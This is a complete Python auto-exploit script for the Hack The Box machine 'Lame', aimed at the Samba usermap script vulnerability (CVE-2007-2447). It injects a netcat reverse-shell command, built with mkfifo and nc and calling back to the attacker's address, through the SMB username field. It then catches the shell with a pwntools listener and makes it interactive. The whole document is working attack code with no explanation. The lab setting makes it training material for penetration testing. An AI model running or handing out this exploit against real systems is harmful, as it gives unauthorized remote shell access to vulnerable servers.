### Auto-Pwn
### Lame - Easy Linux
### By baX
#####################
#!/usr/bin/python3
# -*- coding: utf-8 -*-

from pwn import *
from smb.SMBConnection import SMBConnection
import os
from random import randint


def SMB_exploit(rhost, rport, lhost, lport):
		payload = 'mkfifo /tmp/p; nc ' + lhost + ' ' + lport + ' 0</tmp/p | /bin/sh >/tmp/p 2>&1; rm /tmp/p'
		username = "/=`nohup " + payload + "`"
		conn = SMBConnection(username, "", "", "")
		try:
			conn.connect(rhost, int(rport), timeout=1)
		except:
			log.success("Payload was sent!")

if __name__ == '__main__':
	log.warning("[HTB][Lame]\n")
	log.info("CVE-2007-2447 - Samba usermap script")
	print("")

	LHOST = os.popen("ip -4 addr s tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'").read()
	LHOST = LHOST[:-1]
	LPORT = randint(8000, 9000)
	
	client = listen(LPORT)

	if len(sys.argv) == 1:
		SMB_exploit('10.10.10.3', 445, LHOST, str(LPORT))
		client.interactive()
